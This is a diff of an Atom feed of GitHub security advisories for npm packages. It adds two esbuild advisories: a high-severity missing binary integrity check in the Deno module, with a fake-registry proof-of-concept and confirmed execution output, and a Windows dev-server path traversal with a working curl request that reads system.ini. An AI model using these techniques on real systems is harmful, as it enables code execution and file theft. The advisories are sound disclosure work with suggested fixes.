@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-12T19:35:40.049Z</updated>
+    <updated>2026-06-12T20:40:50.963Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,230 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[esbuild] esbuild: Missing binary integrity verification in Deno module enables remote code execution via NPM_CONFIG_REGISTRY]]></title>
+        <id>https://github.com/advisories/GHSA-gv7w-rqvm-qjhr</id>
+        <link href="https://github.com/advisories/GHSA-gv7w-rqvm-qjhr"/>
+        <updated>2026-06-12T20:08:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The esbuild Deno module (<code>lib/deno/mod.ts</code>) downloads native binary executables from an npm registry and writes them to disk with executable permissions (<code>0o755</code>) <strong>without performing any integrity verification</strong> (e.g., SHA-256 hash check). The Node.js equivalent (<code>lib/npm/node-install.ts</code>) includes a robust <code>binaryIntegrityCheck()</code> function that verifies SHA-256 hashes against hardcoded expected values from <code>package.json</code>, but this protection was never implemented for the Deno distribution.</p>
+<p>When the <code>NPM_CONFIG_REGISTRY</code> environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.</p>
+<h3 id="details">Details</h3>
+<p><strong>Vulnerable code path</strong> — <code>lib/deno/mod.ts</code> lines 62–82:</p>
+<pre><code class="language-typescript">async function installFromNPM(name: string, subpath: string): Promise&lt;string&gt; {
+  const { finalPath, finalDir } = getCachePath(name)
+  try { await Deno.stat(finalPath); return finalPath } catch (e) {}
+
+  const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org"  // line 70: attacker-controlled
+  const url = `${npmRegistry}/${name}/-/${name.replace("@esbuild/", "")}-${version}.tgz`     // line 71: URL uses attacker base
+  const buffer = await fetch(url).then(r =&gt; r.arrayBuffer())                                  // line 72: download
+  const executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract
+
+  await Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })
+  await Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod
+  return finalPath                                                                              // line 81: no hash check
+}
+</code></pre>
+<p><strong>Missing protection</strong> — The Node.js equivalent at <code>lib/npm/node-install.ts</code> lines 228–234:</p>
+<pre><code class="language-typescript">function binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {
+  const hash = crypto.createHash('sha256').update(bytes).digest('hex')
+  const key = `${pkg}/${subpath}`
+  const expected = packageJSON['esbuild.binaryHashes'][key]
+  if (!expected) throw new Error(`Missing hash for "${key}"`)
+  if (hash !== expected) throw new Error(...)
+}
+</code></pre>
+<p>This function is called in both the <code>installUsingNPM()</code> path (line 131) and the <code>downloadDirectlyFromNPM()</code> path (line 243), but <strong>no equivalent exists in the Deno module</strong>. Searching the entire git history confirms <code>binaryIntegrityCheck</code>, <code>binaryHashes</code>, <code>sha256</code>, and <code>hash</code> have never appeared in <code>lib/deno/mod.ts</code>.</p>
+<p><strong>Execution flow after download:</strong> The binary returned by <code>installFromNPM()</code> is passed to <code>spawn()</code> at line 291 of the same file:</p>
+<pre><code class="language-typescript">const child = spawn(binPath, { args: [`--service=${version}`], ... })
+</code></pre>
+<p><strong>Attack vector:</strong> The <code>NPM_CONFIG_REGISTRY</code> environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong> Deno runtime, Node.js (for fake registry)</p>
+<p><strong>Step 1:</strong> Create a fake npm registry that serves a malicious binary:</p>
+<pre><code class="language-javascript">// fake-registry.js
+const http = require('http');
+const zlib = require('zlib');
+http.createServer((req, res) =&gt; {
+  const fakeBin = '#!/bin/sh\necho PWNED &gt; /tmp/deno-esbuild-rce-proof.txt\necho fake-esbuild-0.28.0\n';
+  // ... build tar.gz with fake binary as package/bin/esbuild ...
+  res.writeHead(200, {'Content-Length': gz.length});
+  res.end(gz);
+}).listen(19876, () =&gt; console.log('READY'));
+</code></pre>
+<p><strong>Step 2:</strong> Run the PoC with <code>NPM_CONFIG_REGISTRY</code> pointing to the fake server:</p>
+<pre><code class="language-typescript">// poc.ts — mimics lib/deno/mod.ts installFromNPM code path
+const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org";
+const url = `${npmRegistry}/@esbuild/linux-x64/-/linux-x64-0.28.0.tgz`;
+const buffer = new Uint8Array(await (await fetch(url)).arrayBuffer());
+// ... gzip decompress + tar extraction (same as extractFileFromTarGzip) ...
+await Deno.writeFile("/tmp/downloaded-binary", executable, { mode: 0o755 });
+// *** NO integrity check performed ***
+const cmd = new Deno.Command("/tmp/downloaded-binary");
+await cmd.output(); // RCE: executes attacker-controlled binary
+</code></pre>
+<p><strong>Step 3:</strong> Run:</p>
+<pre><code class="language-bash">node fake-registry.js &amp;
+NPM_CONFIG_REGISTRY="http://127.0.0.1:19876" deno run --allow-all poc.ts
+cat /tmp/deno-esbuild-rce-proof.txt  # Output: PWNED
+</code></pre>
+<p><strong>Observed output in this environment:</strong></p>
+<pre><code>Download URL: http://127.0.0.1:19876/@esbuild/linux-x64/-/linux-x64-0.28.0.tgz
+Binary written to: /tmp/deno-poc/downloaded-binary
+Binary content: #!/bin/sh
+echo PWNED &gt; /tmp/deno-esbuild-rce-proof.txt
+echo fake-esbuild-0.28.0
+
+Executing downloaded binary...
+stdout: fake-esbuild-0.28.0
+
+*** RCE CONFIRMED ***
+Marker file content: PWNED
+</code></pre>
+<p><strong>Build-local verification — using the actual built <code>deno/mod.js</code>:</strong></p>
+<p>The esbuild Deno module was built from source (<code>node scripts/esbuild.js ./esbuild --deno</code>) producing <code>deno/mod.js</code>. The fake registry test was then re-run using the <strong>actual module</strong> via <code>import * as esbuild from "file:///path/to/deno/mod.js"</code>, triggering the real <code>installFromNPM()</code> → <code>installFromNPM()</code> code path:</p>
+<pre><code>[TEST] esbuild Deno module loaded
+[TEST] esbuild version: 0.28.0
+
+[TEST] *** RCE VIA ACTUAL MODULE CONFIRMED ***
+[TEST] Marker file content: VULN-CONFIRMED
+[TEST] The actual built deno/mod.js downloaded and executed
+[TEST] a malicious binary from the fake registry WITHOUT
+[TEST] performing any SHA-256 integrity verification.
+</code></pre>
+<p>The malicious binary was cached at <code>~/.cache/esbuild/bin/@esbuild-linux-x64@0.28.0</code> with contents:</p>
+<pre><code>#!/bin/sh
+echo "VULN-CONFIRMED" &gt; /tmp/esbuild-deno-verify-rce.txt
+echo "0.28.0"
+</code></pre>
+<p>Built-in Deno module (<code>deno/mod.js</code>) confirmed to contain <code>NPM_CONFIG_REGISTRY</code> usage (line 1900) and zero references to <code>binaryIntegrityCheck</code>, <code>binaryHashes</code>, <code>sha256</code>, or <code>crypto.createHash</code>.</p>
+<p><strong>Negative/control case — Node.js rejects the same fake binary:</strong></p>
+<pre><code>Fake binary SHA-256: d85234b9bac94fcda135d112f0c23d9c31bbb14a5502a37e743a3cf2a3750fa1
+Expected hash:       aafacdf135322bf47c882a4ea4db33d0375583f5b9c3fd2d4e12258e470568be
+Hashes match: false
+=&gt; Node.js path REJECTS the fake binary (hash mismatch)
+=&gt; Deno path ACCEPTS it without any check
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>An attacker who can control the <code>NPM_CONFIG_REGISTRY</code> environment variable in a Deno project using esbuild can achieve <strong>arbitrary code execution</strong> with the privileges of the Deno process. This is particularly relevant in:</p>
+<ul>
+<li><strong>CI/CD pipelines</strong> where <code>NPM_CONFIG_REGISTRY</code> is commonly set to point to internal artifact repositories</li>
+<li><strong>Shared development environments</strong> where environment variables may be inherited from parent processes</li>
+<li><strong>Corporate networks</strong> where npm registry mirrors are configured via this environment variable</li>
+</ul>
+<p>The attacker does not need to compromise the npm registry itself — only the environment variable or network path between the Deno process and the registry.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<ol>
+<li><strong>Add SHA-256 integrity verification to the Deno module</strong>, mirroring the existing <code>binaryIntegrityCheck()</code> function from <code>lib/npm/node-install.ts</code>:</li>
+</ol>
+<pre><code class="language-typescript">// In lib/deno/mod.ts, after extracting the binary:
+const hashBuffer = await crypto.subtle.digest("SHA-256", executable);
+const hash = Array.from(new Uint8Array(hashBuffer)).map(b =&gt; b.toString(16).padStart(2, '0')).join('');
+const key = `${name}/${subpath}`;
+const expected = EXPECTED_HASHES[key]; // Import from a shared hash manifest
+if (hash !== expected) throw new Error(`Binary integrity check failed for "${key}"`);
+</code></pre>
+<ol start="2">
+<li><strong>Validate the <code>NPM_CONFIG_REGISTRY</code> URL</strong> to ensure it uses HTTPS (or at minimum warn about HTTP):</li>
+</ol>
+<pre><code class="language-typescript">const npmRegistry = Deno.env.get("NPM_CONFIG_REGISTRY") || "https://registry.npmjs.org";
+if (npmRegistry.startsWith("http://")) {
+  console.warn(`[esbuild] Warning: NPM_CONFIG_REGISTRY uses insecure HTTP`);
+}
+</code></pre>
+<ol start="3">
+<li><strong>Add <code>ESBUILD_BINARY_PATH</code> validation</strong> in the Deno module, mirroring the <code>isValidBinaryPath()</code> check from <code>lib/npm/node-platform.ts</code>.</li>
+</ol>
+<p><strong>Regression test suggestion:</strong> Add a test that verifies the Deno download path rejects a binary with a mismatched SHA-256 hash.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/evanw/esbuild/security/advisories/GHSA-gv7w-rqvm-qjhr">https://github.com/evanw/esbuild/security/advisories/GHSA-gv7w-rqvm-qjhr</a></li>
+<li><a href="https://github.com/evanw/esbuild/releases/tag/v0.28.1">https://github.com/evanw/esbuild/releases/tag/v0.28.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-gv7w-rqvm-qjhr">https://github.com/advisories/GHSA-gv7w-rqvm-qjhr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gv7w-rqvm-qjhr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-12T20:08:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[esbuild] esbuild allows arbitrary file read when running the development server on Windows]]></title>
+        <id>https://github.com/advisories/GHSA-g7r4-m6w7-qqqr</id>
+        <link href="https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"/>
+        <updated>2026-06-12T20:08:54.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The development server contains a path traversal vulnerability on Windows when serving files from <code>servedir</code>.</p>
+<p>Due to the use of <code>path.Clean()</code> (which only normalizes forward-slash <code>/</code> separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (<code>\</code>) that bypass the intended directory containment logic. An attacker can escape the configured <code>servedir</code> root and access arbitrary files on the filesystem.
+This issue affects Windows environments only.</p>
+<h3 id="details">Details</h3>
+<p>The request path is sanitized using:</p>
+<pre><code class="language-go">// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165
+queryPath := path.Clean(req.URL.Path)[1:]
+</code></pre>
+<p>However:</p>
+<ul>
+<li><code>path.Clean()</code> is POSIX-style and only understands <code>/</code> (docs: <code>https://pkg.go.dev/path#Clean</code>)</li>
+<li>On Windows, <code>\</code> is a valid path separator</li>
+<li><code>path.Clean()</code> does not treat <code>\</code> as a separator</li>
+</ul>
+<p>Later, the server constructs the absolute path:</p>
+<pre><code class="language-go">// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221
+absPath := h.fs.Join(h.servedir, queryPath)
+</code></pre>
+<p>If <code>queryPath</code> contains sequences such as:</p>
+<pre><code>..\..\..\..\..\..\..\Windows\system.ini
+</code></pre>
+<p><code>path.Clean()</code> will not normalize them, but the Windows filesystem will interpret <code>\</code> as directory separators when resolving <code>absPath</code>.
+Because the implementation does not verify that the final resolved path remains within <code>servedir</code>, it allows directory traversal outside the intended root directory.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<pre><code class="language-go">// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165
+    queryPath := path.Clean(req.URL.Path)[1:]
+    ....
+    // Check for a file in the "servedir" directory
+    if h.servedir != "" &amp;&amp; kind != fs.FileEntry {
+        absPath := h.fs.Join(h.servedir, queryPath)
+        if absDir := h.fs.Dir(absPath); absDir != absPath {
+            if entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {
+                if entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil &amp;&amp; entry.Kind(h.fs) == fs.FileEntry {
+    ....				
+</code></pre>
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+<pre><code>npm install --save-exact --save-dev esbuild
+
+echo "console.log(1)" &gt; app.js
+
+.\node_modules\.bin\esbuild --version
+0.27.3
+
+.\node_modules\.bin\esbuild app.js --bundle --outdir=www --servedir=www --watch
+
+curl -i --path-as-is "http://localhost:8000/..\..\..\..\..\..\..\Windows\system.ini"
+&lt;content of Windows\system.ini&gt;
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Arbitrary file read on Windows</li>
+<li>Exposure of sensitive files</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr">https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr</a></li>
+<li><a href="https://github.com/evanw/esbuild/releases/tag/v0.28.1">https://github.com/evanw/esbuild/releases/tag/v0.28.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-g7r4-m6w7-qqqr">https://github.com/advisories/GHSA-g7r4-m6w7-qqqr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g7r4-m6w7-qqqr</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-06-12T20:08:53.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[joi] joi has an uncaught RangeError on deeply nested input through recursive `link()` schemas]]></title>
         <id>https://github.com/advisories/GHSA-q7cg-457f-vx79</id>
@@ -1221,83 +1445,5 @@ graph.invoke(..., {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-11T13:27:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@grpc/grpc-js] @grpc/grpc-js: An incoming malformed compressed message can cause a client or server crash]]></title>
-        <id>https://github.com/advisories/GHSA-99f4-grh7-6pcq</id>
-        <link href="https://github.com/advisories/GHSA-99f4-grh7-6pcq"/>
-        <updated>2026-06-11T13:27:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>An invalid incoming compressed message can cause a client or server process to crash. This affects all clients and servers that use @grpc/grpc-js</p>
-<h3 id="patches">Patches</h3>
-<p>The following version have fixes for this vulnerability:</p>
-<ul>
-<li>1.9.16</li>
-<li>1.10.12</li>
-<li>1.11.4</li>
-<li>1.12.7</li>
-<li>1.13.5</li>
-<li>1.14.4</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-99f4-grh7-6pcq">https://github.com/grpc/grpc-node/security/advisories/GHSA-99f4-grh7-6pcq</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16</a></li>
-<li><a href="https://github.com/advisories/GHSA-99f4-grh7-6pcq">https://github.com/advisories/GHSA-99f4-grh7-6pcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-99f4-grh7-6pcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-11T13:27:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@grpc/grpc-js] @grpc/grpc-js: An incoming malformed compressed message can cause a client or server crash]]></title>
-        <id>https://github.com/advisories/GHSA-99f4-grh7-6pcq</id>
-        <link href="https://github.com/advisories/GHSA-99f4-grh7-6pcq"/>
-        <updated>2026-06-11T13:27:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>An invalid incoming compressed message can cause a client or server process to crash. This affects all clients and servers that use @grpc/grpc-js</p>
-<h3 id="patches">Patches</h3>
-<p>The following version have fixes for this vulnerability:</p>
-<ul>
-<li>1.9.16</li>
-<li>1.10.12</li>
-<li>1.11.4</li>
-<li>1.12.7</li>
-<li>1.13.5</li>
-<li>1.14.4</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-99f4-grh7-6pcq">https://github.com/grpc/grpc-node/security/advisories/GHSA-99f4-grh7-6pcq</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16">https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16</a></li>
-<li><a href="https://github.com/advisories/GHSA-99f4-grh7-6pcq">https://github.com/advisories/GHSA-99f4-grh7-6pcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-99f4-grh7-6pcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-11T13:27:44.000Z</published>
     </entry>
 </feed>
